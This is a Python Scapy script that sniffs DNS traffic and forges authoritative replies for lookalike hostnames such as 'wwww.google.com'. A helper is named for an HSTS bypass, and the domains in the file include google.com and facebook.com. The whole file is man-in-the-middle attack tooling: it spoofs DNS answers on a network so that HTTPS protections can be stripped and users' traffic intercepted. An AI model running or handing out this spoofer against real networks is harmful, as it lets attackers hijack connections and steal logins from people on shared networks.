from scapy.all import *

class DNSResolver:
    def __init__(self, custom_domains):
        self.custom_domains = custom_domains

    def process_packet(self, packet):
        if packet.haslayer(DNS) and packet.getlayer(DNS).qd:
            qname = packet[DNSQR].qname.decode()
            for domain in self.custom_domains:
                if 'w' + domain in qname:
                    if qname.startswith('wwww.'):
                        new_qname = qname.replace('wwww.', 'www.')
                    else:
                        parts = qname.split('.')
                        parts[0] = parts[0][1:]
                        new_qname = '.'.join(parts)

                    # Create the DNS response
                    dns_response = (
                        IP(dst=packet[IP].src, src=packet[IP].dst) /
                        UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                        DNS(
                            id=packet[DNS].id,
                            qd=packet[DNS].qd,
                            aa=1,
                            qr=1,
                            an=DNSRR(rrname=qname, rdata=new_qname)
                        )
                    )

                    send(dns_response, verbose=0)
                    return

    def start(self):
        sniff(filter="udp port 53", prn=self.process_packet)

def parse_hsts_bypass_config(filename):
    with open(filename, 'r') as file:
        custom_domains = [line.strip() for line in file if line.strip()]
    return custom_domains

if __name__ == "__main__":
    custom_domains = ["cat.com", 'google.com', 'facebook.com']
    dns_resolver = DNSResolver(custom_domains)
    dns_resolver.start()
